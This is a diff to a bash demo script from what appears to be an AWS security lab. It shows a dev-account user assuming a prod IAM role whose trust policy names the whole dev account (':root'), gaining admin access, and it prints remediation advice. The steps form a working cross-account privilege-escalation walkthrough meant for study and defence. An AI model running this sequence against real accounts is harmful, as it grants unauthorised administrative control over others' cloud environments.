@@ -1,7 +1,7 @@
 #!/bin/bash
 
-# Demo script for cross-account simple-role-assumption privilege escalation
-# This scenario demonstrates cross-account role assumption from dev to prod for admin access
+# Demo script for cross-account root-trust-role-assumption privilege escalation
+# This scenario demonstrates the security risk of trusting :root (entire account) instead of specific principals
 
 set -e
 
@@ -13,11 +13,11 @@ BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 
 # Configuration
-STARTING_USER_DEV="pl-dev-xsare-to-admin-starting-user"
-TARGET_ROLE_PROD="pl-prod-xsare-to-admin-target-role"
+STARTING_USER_DEV="pl-dev-xsarrt-to-admin-starting-user"
+TARGET_ROLE_PROD="pl-prod-xsarrt-to-admin-target-role"
 
 echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}Cross-Account Simple Role Assumption Privilege Escalation Demo${NC}"
+echo -e "${GREEN}Cross-Account Root Trust Role Assumption Demo${NC}"
 echo -e "${GREEN}========================================${NC}\n"
 
 # Step 1: Retrieve credentials and region from Terraform grouped outputs
@@ -25,7 +25,7 @@ echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
 cd ../../../../../..  # Navigate to root of terraform project
 
 # Get the module output using the grouped output pattern
-MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.cross_account_dev_to_prod_one_hop_simple_role_assumption.value // empty')
+MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.cross_account_dev_to_prod_one_hop_root_trust_role_assumption.value // empty')
 
 if [ -z "$MODULE_OUTPUT" ]; then
     echo -e "${RED}Error: Could not find terraform output${NC}"
@@ -92,8 +92,29 @@ PROD_ACCOUNT_ID=$(echo $TARGET_ROLE_ARN | cut -d':' -f5)
 echo "Prod Account ID: $PROD_ACCOUNT_ID"
 echo -e "${GREEN}✓ Extracted prod account ID from target role ARN${NC}\n"
 
-# Step 4: Verify lack of admin access in prod account
-echo -e "${YELLOW}Step 4: Verifying we don't have admin access in prod yet${NC}"
+# Step 4: Display trust policy information - CRITICAL SECURITY ISSUE
+echo -e "${YELLOW}Step 4: Examining trust policy of target role${NC}"
+echo -e "${RED}⚠️  CRITICAL SECURITY ISSUE IDENTIFIED ⚠️${NC}"
+echo ""
+echo "The prod target role trusts the ENTIRE dev account via :root principal:"
+echo ""
+echo -e "${BLUE}Trust Policy Principal:${NC}"
+echo "  {\"AWS\": \"arn:aws:iam::${DEV_ACCOUNT_ID}:root\"}"
+echo ""
+echo -e "${RED}Security Impact:${NC}"
+echo "  • ANY principal in dev account with sts:AssumeRole can assume this role"
+echo "  • This includes: ALL IAM users, ALL IAM roles, ALL federated users"
+echo "  • The :root principal grants account-wide trust, not just specific principals"
+echo ""
+echo -e "${YELLOW}Best Practice:${NC}"
+echo "  • Trust specific principals instead: arn:aws:iam::${DEV_ACCOUNT_ID}:role/specific-role"
+echo "  • Add conditions to restrict which principals can assume the role"
+echo "  • Use aws:PrincipalArn or aws:PrincipalOrgID conditions"
+echo ""
+echo -e "${GREEN}✓ Trust policy analyzed${NC}\n"
+
+# Step 5: Verify lack of admin access in prod account
+echo -e "${YELLOW}Step 5: Verifying we don't have admin access in prod yet${NC}"
 echo "Attempting to list IAM users in prod account (should fail)..."
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
@@ -102,13 +123,16 @@ else
 fi
 echo ""
 
-# Step 5: Assume the prod target role
-echo -e "${YELLOW}Step 5: Assuming the target role in prod account${NC}"
+# Step 6: Assume the prod target role
+echo -e "${YELLOW}Step 6: Assuming the target role in prod account${NC}"
 echo "Target Role ARN: $TARGET_ROLE_ARN"
+echo ""
+echo "Because the role trusts :root, we can assume it with our basic user credentials..."
+echo ""
 
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $TARGET_ROLE_ARN \
-    --role-session-name cross-account-demo-session \
+    --role-session-name root-trust-demo-session \
     --query 'Credentials' \
     --output json)
 
@@ -136,8 +160,8 @@ fi
 
 echo -e "${GREEN}✓ Successfully assumed role in prod account${NC}\n"
 
-# Step 6: Verify administrator access in prod account
-echo -e "${YELLOW}Step 6: Verifying administrator access in prod account${NC}"
+# Step 7: Verify administrator access in prod account
+echo -e "${YELLOW}Step 7: Verifying administrator access in prod account${NC}"
 echo "Attempting to list IAM users..."
 
 if aws iam list-users --max-items 3 --output table; then
@@ -155,18 +179,37 @@ echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER_DEV in dev account ($DEV_ACCOUNT_ID)"
-echo "2. Assumed role: $TARGET_ROLE_PROD in prod account ($PROD_ACCOUNT_ID)"
-echo "3. Achieved: Administrative access in prod account"
+echo "2. Identified: Prod role trusts :root (entire dev account)"
+echo "3. Assumed role: $TARGET_ROLE_PROD in prod account ($PROD_ACCOUNT_ID)"
+echo "4. Achieved: Administrative access in prod account"
 
 echo -e "\n${YELLOW}Cross-Account Attack Path:${NC}"
 echo "dev:$STARTING_USER_DEV → (sts:AssumeRole) → prod:$TARGET_ROLE_PROD → admin access"
+
+echo -e "\n${RED}⚠️  CRITICAL SECURITY FINDING ⚠️${NC}"
+echo -e "${RED}The target role trusts 'arn:aws:iam::${DEV_ACCOUNT_ID}:root'${NC}"
+echo ""
+echo "This means that ANY of the following could perform this exact attack:"
+echo "  • ANY IAM user in dev account with sts:AssumeRole permission"
+echo "  • ANY IAM role in dev account with sts:AssumeRole permission"
+echo "  • ANY federated user in dev account with sts:AssumeRole permission"
+echo "  • ANY EC2 instance with an instance profile in dev account"
+echo "  • ANY Lambda function with an execution role in dev account"
+echo ""
+echo "The :root principal grants account-wide trust, vastly expanding the attack surface."
 
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- No persistent artifacts created"
 echo "- Role assumption created temporary session credentials that will expire"
 
-echo -e "\n${BLUE}ℹ This demonstrates a cross-account privilege escalation path${NC}"
-echo -e "${BLUE}An attacker with dev account credentials can gain admin access to prod${NC}"
+echo -e "\n${BLUE}ℹ This demonstrates why trusting :root is a critical security misconfiguration${NC}"
+echo -e "${BLUE}An attacker compromising ANY principal in dev can gain admin access to prod${NC}"
+
+echo -e "\n${YELLOW}Recommended Remediation:${NC}"
+echo "1. Replace :root trust with specific principal ARNs"
+echo "2. Add aws:PrincipalArn conditions to restrict assumable roles"
+echo "3. Use aws:PrincipalOrgID to limit trust to specific AWS Organizations"
+echo "4. Implement least privilege - only grant trust to principals that need it"
 
 echo -e "\n${YELLOW}To clean up (no cleanup needed for this scenario):${NC}"
 echo "  ./cleanup_attack.sh"
